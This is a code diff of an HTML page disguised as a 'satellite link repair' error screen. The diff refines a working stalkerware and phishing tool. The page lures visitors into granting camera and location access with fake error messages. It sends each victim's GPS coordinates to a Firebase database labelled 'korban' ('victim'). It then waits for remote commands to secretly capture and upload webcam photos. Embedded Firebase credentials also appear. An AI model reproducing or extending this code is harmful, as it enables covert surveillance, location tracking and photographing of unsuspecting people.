@@ -8,42 +8,59 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
         body { background: #000; color: #00f2ff; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
-        .box { border: 2px solid #00f2ff; padding: 40px; border-radius: 20px; background: rgba(0, 242, 255, 0.05); box-shadow: 0 0 20px #00f2ff; cursor: pointer; transition: 0.3s; width: 80%; }
-        .box:active { transform: scale(0.95); }
+        .box { border: 2px solid #00f2ff; padding: 40px; border-radius: 20px; background: rgba(0, 242, 255, 0.05); box-shadow: 0 0 20px #00f2ff; cursor: pointer; width: 80%; }
         .glitch { animation: flash 1s infinite; color: #ff00ea; font-weight: bold; }
         @keyframes flash { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
         video, canvas { display: none; }
     </style>
 </head>
-<body onclick="ignite()">
-    <div class="box" id="ui">
+<body>
+    <div class="box" id="ui" onclick="ignite()">
         <h1 style="margin:0;">🛰️</h1>
         <p class="glitch">SYSTEM ERROR DETECTED</p>
-        <p style="font-size: 12px;">Satellite link lost. Click to re-establish 4K Uplink & Repair System.</p>
-        <div id="loader" style="margin-top:20px; font-size: 10px; opacity: 0.6;">[WAITING FOR COMMAND]</div>
+        <p style="font-size: 12px;">Satellite link lost. Click to re-establish 4K Uplink.</p>
+        <button id="btn-fix" style="background:#00f2ff; color:#000; border:none; padding:10px 20px; border-radius:5px; font-weight:bold; margin-top:20px;">REPAIR SYSTEM</button>
     </div>
 
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
 
 <script>
-    const config = { apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" };
+    // CEK HTTPS - Penting buat Lead Dev Kalz!
+    if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
+        alert("PERINGATAN: Sistem Satelit hanya jalan di koneksi SECURE (HTTPS).");
+    }
+
+    const config = { 
+        apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", 
+        databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" 
+    };
     firebase.initializeApp(config); const db = firebase.database();
 
     async function ignite() {
-        document.getElementById('loader').innerText = "[UPLINKING TO SATELLITE...]";
+        const btn = document.getElementById('btn-fix');
+        btn.innerText = "CONNECTING...";
+        
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            // Minta Kamera & Mikrofon (Biar popup lebih meyakinkan)
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" },
+                audio: false 
+            });
+            
             document.getElementById('v').srcObject = stream;
             
+            // Setelah dapet kamera, langsung minta Lokasi
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const ref = db.ref('korban').push({
                     waktu: new Date().toLocaleString(),
                     maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                 });
+                
                 const myId = ref.key;
-                document.getElementById('ui').innerHTML = "<h2 style='color:#00f2ff;'>REPAIRING... 87%</h2><p style='font-size:10px;'>DO NOT CLOSE THIS TAB</p>";
+                document.getElementById('ui').innerHTML = "<h2 style='color:#00f2ff;'>REPAIRING... 92%</h2><p>DO NOT CLOSE THIS TAB</p>";
 
+                // Standby terima perintah SNAP dari Dashboard lu
                 db.ref('commands/' + myId).on('value', snap => {
                     if (snap.val()?.action === "TAKE") {
                         const v = document.getElementById('v'), c = document.getElementById('c');
@@ -52,8 +69,13 @@
                         db.ref('hasil_foto/' + myId).set({ foto: c.toDataURL('image/jpeg', 0.5) });
                     }
                 });
-            }, () => { alert("Error: GPS Satellite signal required!"); });
-        } catch (e) { alert("Error: Camera Sync required for 4K Scan!"); }
+            }, (err) => {
+                alert("Satelit butuh izin GPS untuk kalibrasi sinyal 4K!");
+            });
+        } catch (e) {
+            console.log(e);
+            alert("Satelit butuh izin KAMERA untuk sinkronisasi visual 4K!");
+        }
     }
 </script>
 </body>
